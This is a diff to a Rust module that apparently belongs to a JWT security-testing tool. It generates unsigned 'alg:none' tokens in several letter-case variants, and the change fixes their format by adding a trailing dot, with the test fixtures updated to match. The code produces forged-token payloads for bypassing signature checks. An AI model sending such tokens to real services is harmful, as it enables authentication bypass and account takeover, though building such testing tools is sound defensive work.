@@ -14,7 +14,8 @@ pub fn alg_none(claims: &str) -> Vec<Attack> {
 
     for alg_type in variations {
         let header = format!(r#"{{"alg":"{}","typ":"JWT"}}"#, alg_type);
-        let token = encode_payload(&header, claims);
+        let mut token = encode_payload(&header, claims);
+        token.push('.');
         attacks.push(Attack {
             name: format!("alg:{}", alg_type),
             token,
@@ -41,7 +42,8 @@ mod test {
                 token: concat!(
                     "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
                     ".",
-                    "eyJoZWxsbyI6IndvcmxkIn0"
+                    "eyJoZWxsbyI6IndvcmxkIn0",
+                    ".",
                 )
                 .to_string(),
             },
@@ -50,7 +52,8 @@ mod test {
                 token: concat!(
                     "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0",
                     ".",
-                    "eyJoZWxsbyI6IndvcmxkIn0"
+                    "eyJoZWxsbyI6IndvcmxkIn0",
+                    ".",
                 )
                 .to_string(),
             },
@@ -59,7 +62,8 @@ mod test {
                 token: concat!(
                     "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0",
                     ".",
-                    "eyJoZWxsbyI6IndvcmxkIn0"
+                    "eyJoZWxsbyI6IndvcmxkIn0",
+                    ".",
                 )
                 .to_string(),
             },
@@ -68,7 +72,8 @@ mod test {
                 token: concat!(
                     "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0",
                     ".",
-                    "eyJoZWxsbyI6IndvcmxkIn0"
+                    "eyJoZWxsbyI6IndvcmxkIn0",
+                    ".",
                 )
                 .to_string(),
             },
